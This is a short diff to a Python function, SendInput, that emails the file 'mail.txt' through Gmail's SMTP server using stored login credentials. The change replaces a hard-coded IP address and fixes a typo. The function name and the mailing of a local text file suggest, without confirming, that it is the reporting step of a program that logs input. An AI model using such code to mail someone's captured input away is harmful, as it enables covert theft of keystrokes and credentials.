@@ -36,9 +36,12 @@ def SendInput():
     Adjunt.set_payload(open("mail.txt", "rb").read())
     message.attach(Adjunt)
 
-    server = smtp.SMTP('64.233.184.108')
+
+    #server = smtp.SMTP('64.233.184.108')
+    
+    server = smtp.SMTP("smtp.gmail.com", 587)
     server.starttls()
-    server.login(Parameters.MailDirection, Parameters.MailPasword)
+    server.login(Parameters.MailDirection, Parameters.MailPassword)
     server.sendmail(Parameters.MailDirection, Parameters.Mailaddressee, message.as_string())
 
     print("The Mail Has Been Send")
